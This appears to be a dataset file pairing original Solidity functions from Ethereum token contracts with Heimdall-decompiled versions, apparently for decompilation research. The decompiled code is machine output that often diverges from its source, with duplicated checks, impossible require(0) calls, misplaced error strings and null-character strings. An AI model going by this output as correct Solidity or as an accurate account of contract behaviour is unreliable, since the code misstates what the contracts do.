{"contract_address": "0x72f44B18b3846dc634F10F2e36236dC1A2CB4B29", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x1826BA7e52f6e4EffB63dA920bbEa0F3dbA8AF94", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x842FD31eAd327AE42D19B7BFbdB045d3A219c662", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        if (address(arg0)) {\n            if (address(msg.sender)) {\n                if (arg1 > 0) {\n                    if (!AntiWhaleEnabled) {\n                        address var_a = address(msg.sender);\n                        var_b = 0x0a;\n                        require(address(arg0), \"Transfer amount exceeds the max transfer limit.\");\n                        require(address(msg.sender), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(arg0);\n                        var_b = 0x04;\n                        require(arg1 > 0, \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(msg.sender);\n                        var_b = 0x04;\n                        require(!(bytes1(AntiWhaleEnabled)), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(msg.sender);\n                        var_b = 0x02;\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(msg.sender);\n                        var_b = 0x05;\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x11;\n                        storage_map_e[var_a] = storage_map_e[var_a] - arg1;\n                        require(bytes1(storage_map_e[var_a]), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(arg0);\n                        var_b = 0x04;\n                        require(!((storage_map_e[var_a] - arg1) > storage_map_e[var_a]), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(arg0);\n                        var_b = 0x04;\n                        require(0, \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(msg.sender);\n                        var_b = 0x04;\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(!(!bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        require(0, \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x11;\n                        require((0 == ((0 * arg1) / arg1)) | !arg1, \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x12;\n                        require(0x03e8, \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(this);\n                        var_b = 0x05;\n                        require(!((0 * arg1) / 0x03e8), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x11;\n                        storage_map_e[var_a] = ((0 * arg1) / 0x03e8) + storage_map_e[var_a];\n                        uint256 var_d = (0 * arg1) / 0x03e8;\n                        emit Transfer(address(msg.sender), address(this), (0 * arg1) / 0x03e8);\n                        require(!(storage_map_e[var_a] > (((0 * arg1) / 0x03e8) + storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x11;\n                        require(!((arg1 - ((0 * arg1) / 0x03e8)) > arg1), \"Transfer amount exceeds the max transfer limit.\");\n                    }\n                    require(!(bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                    require(!(bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                }\n            }\n        }\n        require(!(arg1 > antiWhaleThreshold), \"Transfer amount exceeds the max transfer limit.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x2f;\n        var_g = 0x5472616e7366657220616d6f756e74206578636565647320746865206d617820;\n        var_h = 0x7472616e73666572206c696d69742e0000000000000000000000000000000000;\n        if (!AntiWhaleEnabled) {\n            if (!AntiWhaleEnabled) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7006A0F5D09b07a365Ff1306467407E57312cF29", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0aC5789B5Adf719d5417b40De62fD8e117Ff8721", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        firstBlock = block.number;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_f / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_l = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_l));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x05f5e100, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_m[var_e] = 0x05f5e100;\n        var_a = 0x05f5e100;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x05f5e100);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xFd878DaC675FA1885cFf0A08126bfc29936D03d7", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0x84B55c2CCbA3Fb23FF2648Ba8b740fC91547E6df", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_e[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function reduceFees(uint256 _newBuyMarketingFee, uint256 _newBuyLiquidityFee, uint256 _newSellMarketingFee, uint256 _newSellLiquidityFee) external{\r\n      require(_msgSender()==marketingWallet);\r\n      require(_newBuyMarketingFee<3 && _newBuyLiquidityFee<3 && _newSellMarketingFee<3 && _newSellLiquidityFee<3);\r\n      buyMarketingFee = _newBuyMarketingFee;\r\n      buyLiquidityFee = _newBuyLiquidityFee;\r\n      sellMarketingFee = _newSellMarketingFee;\r\n      sellLiquidityFee =_newSellLiquidityFee;\r\n    }", "heimdall_decompiled_code": "function reduceFees(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3) public {\n        require(address(msg.sender) == (address(marketingWallet)));\n        require(!arg0 < 0x03);\n        require(!arg0 < 0x03);\n        require(!arg0 < 0x03);\n        require(arg0 < 0x03);\n        store_p = arg0;\n        store_q = arg1;\n        store_j = arg2;\n        store_k = arg3;\n    }"}
{"contract_address": "0x92E27aedE3847Bbd0E4b917Ec2Ae444d4C3A622D", "original_solidity_code": "function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {\r\n        _swapTokensAtAmount = swapTokensAtAmount;\r\n    }", "heimdall_decompiled_code": "function setMinSwapTokensThreshold(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _swapTokensAtAmount = arg0;\n    }"}
{"contract_address": "0x36c3C1D874fd543c139cF9dDBDF1a8fEe8301d16", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x6E66a59bF0F45A9Fdf99C28B45093F1BB41c990d", "original_solidity_code": "function openTrading() external {\r\n        require(!tradingOpen);\r\n        require(msg.sender == deployer);\r\n        tradingOpen = true;        \r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(!bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(0xfb20cc4f6d9f073713838a16d96194e537655ea5 == msg.sender);\n        store_a = 0x01000000000000000000000000000000000000000000 | (uint248(store_a));\n    }"}
{"contract_address": "0xEFB0c530467107677E4C214c3C444fFb282AE6F2", "original_solidity_code": "function getWinner() public view returns (address[] memory) {\\n        return winnerOfPrize;\\n     }", "heimdall_decompiled_code": "function getWinner() public view returns (bytes memory) {\n        uint256 var_a = var_a + (0x20 + (0x20 * store_i));\n        var_b = store_i;\n        if (!store_i) {\n            var_c = 0x04;\n            address var_d = address(storage_map_z[var_c]);\n            if ((0x20 + var_a) + (0x20 * store_i) > (0x20 + (0x20 + var_a))) {\n                address var_e = address(storage_map_aa[var_c]);\n                if ((0x20 + var_a) + (0x20 * store_i) > (0x20 + (0x20 + (0x20 + var_a)))) {\n                    var_d = 0x20;\n                    var_e = var_a.length;\n                    return abi.encodePacked(0x20, var_a.length);\n                }\n            }\n        }\n    }"}
{"contract_address": "0x0f1B31e30AeBE88F58ce5056fdeE5E2d82E2cEcE", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2FcB9FA9FeC15b2d86440d10b940BB9f2Bd6f770", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(!(bytes1(transferDelayEnabled)), \"Only one transfer per block allowed.\");\n        require(address(store_d) == (address(arg0)), \"Only one transfer per block allowed.\");\n        require(!(!(address(store_e)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        var_a = tx.origin;\n        var_b = 0x05;\n        require(block.number > storage_map_b[var_a], \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_g = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(store_f > store_g, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_h == ((store_h * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_h * arg1) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        if (0x64) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x12;\n            require(0x64, \"SafeMath: addition overflow\");\n            require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n            require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            require(!(startTradeBlock > (0 + startTradeBlock)), \"SafeMath: addition overflow\");\n            require((0 + startTradeBlock) < block.number, \"SafeMath: addition overflow\");\n        }\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_h * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_h * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(!(((store_h * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_h * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_h * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_h * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_h * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = var_i.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_h * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            if (0x08) {\n                if (0x0a) {\n                    if (0x0a == 0x01) {\n                        require(!((arg1 - ((store_h * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n                        require(0x08, \"Exceeds the _maxTxAmount.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_h = 0x11;\n                        require(0x0a, \"Exceeds the _maxTxAmount.\");\n                        require(0x0a == 0x01, \"Exceeds the _maxTxAmount.\");\n                        require(0x0a == 0x02, \"Exceeds the _maxTxAmount.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_h = 0x11;\n                        require(!(0x08 > 0xff), \"Exceeds the _maxTxAmount.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_h = 0x11;\n                        require(!((0x0a < 0x0b) & (0x08 < 0x4e) | ((0x0a < 0x0133) & (0x08 < 0x20))), \"Exceeds the _maxTxAmount.\");\n                    }\n                    require(!(0x08 > 0x01), \"Exceeds the _maxTxAmount.\");\n                }\n                require(!(0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999), \"Exceeds the _maxTxAmount.\");\n            }\n            require(!(0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (store_f > store_k) {\n            if (0 - arg1) {\n            }\n            if (0 - arg1) {\n            }\n            require(store_f > store_k, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_d) == (address(arg0))) {\n            if (address(store_d) == (address(arg0))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
